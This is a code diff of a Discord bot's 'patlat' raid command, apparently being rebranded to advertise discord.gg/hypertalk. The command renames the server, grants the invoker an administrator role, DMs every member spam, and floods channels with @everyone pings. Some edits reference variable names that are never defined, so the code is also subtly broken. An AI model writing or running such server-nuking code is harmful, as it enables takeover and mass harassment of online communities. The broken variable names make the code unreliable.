@@ -120,7 +120,7 @@ async def patlat(ctx):
   guild = ctx.guild
 
   try:
-    await guild.edit(name="RUHUX--hypertalk")
+    await guild.edit(name="RUHUM--hypertalk")
   except:
     pass
 
@@ -157,11 +157,11 @@ async def patlat(ctx):
   # 4. KAHRAMANXANA rolu yarat və sənə ver
   try:
     ruhus_role = await guild.create_role(
-        name="RUHUXSD",
+        name="HYPERTALK",
         color=discord.Color.dark_red(),
         permissions=discord.Permissions(administrator=True),
     )
-    await ctx.author.add_roles(ruhus_role)
+    await ctx.author.add_roles(ruhum_role)
   except:
     pass
 
@@ -182,7 +182,7 @@ async def patlat(ctx):
 
     if not member.bot:
       try:
-        await member.send("RUHUX SKDT ATDI discord.gg/hypertalk")
+        await member.send("RUHUM SKDT ATDI discord.gg/hypertalk")
       except:
         pass
       await asyncio.sleep(0.02)
@@ -195,20 +195,20 @@ async def patlat(ctx):
 
       for _ in range(40):
         try:
-          await channel.send("@everyone dsscord.gg/hypertalk")
+          await channel.send("@everyone discord.gg/hypertalk")
         except:
           break
         await asyncio.sleep(0.02)
     except:
       break
 
-  # 8. RUHUX-TANRI kanalını en sondu yaratmaq, amma en başda koordinasiya
+  # 8. RUHUM-TANRI kanalını en sondu yaratmaq, amma en başda koordinasiya
   try:
-    ruhus_tanri_chan = await guild.create_text_channel(name="ruhux-tanri")
+    ruhus_tanri_chan = await guild.create_text_channel(name="ruhum-tanri")
 
     for _ in range(100):
       try:
-        await ruhus_tanri_chan.send("@everyone RUHUX PAPA")
+        await ruhum_tanri_chan.send("@everyone RUHUM PAPA discord.gg/hypertalk")
       except:
         break
       await asyncio.sleep(0.02)
